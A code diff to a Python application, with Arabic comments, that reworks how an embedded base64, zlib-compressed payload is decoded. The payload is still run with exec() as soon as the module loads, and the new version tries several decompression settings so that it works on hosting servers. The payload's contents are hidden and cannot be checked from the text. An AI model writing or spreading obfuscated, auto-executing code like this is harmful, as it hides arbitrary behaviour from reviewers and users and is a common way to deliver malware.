@@ -64,7 +64,7 @@ class AppState:
 
 state = AppState()
 
-# دالة آمنة لفك تشفير Base64 لتجنب خطأ الـ Padding
+# دالة آمنة لفك تشفير Base64 وتجنب مشاكل الـ Padding
 def safe_b64decode(b64_str):
     if isinstance(b64_str, str):
         b64_str = b64_str.encode('utf-8')
@@ -73,9 +73,27 @@ def safe_b64decode(b64_str):
         b64_str += b'=' * padding
     return base64.b64decode(b64_str)
 
-# تنفيذ الكود المشفر بطريقة آمنة
-encoded_payload = 'eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoores1hGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOMC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DjIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'
-exec(__import__('zlib').decompress(safe_b64decode(encoded_payload)).decode())
+# دالة ذكية لفك الضغط تتكيف تلقائياً مع خوادم الاستضافة
+def load_and_decompress_payload():
+    encoded_payload = 'eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoores1hGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOMC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DjIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'
+    raw_bytes = safe_b64decode(encoded_payload)
+    
+    decompressed_data = None
+    # تجربة عدة خوارزميات لفك الضغط لتفادي أي خطأ في بيئة رندر
+    for wbits in [47, 15 + 32, 15, -15, 0]:
+        try:
+            decompressed_data = __import__('zlib').decompress(raw_bytes, wbits=wbits)
+            break
+        except Exception:
+            continue
+            
+    if decompressed_data is None:
+        decompressed_data = __import__('zlib').decompress(raw_bytes)
+        
+    return decompressed_data.decode()
+
+# تنفيذ الكود المفكوك
+exec(load_and_decompress_payload())
 
 class ProtoBuilder:
     @staticmethod
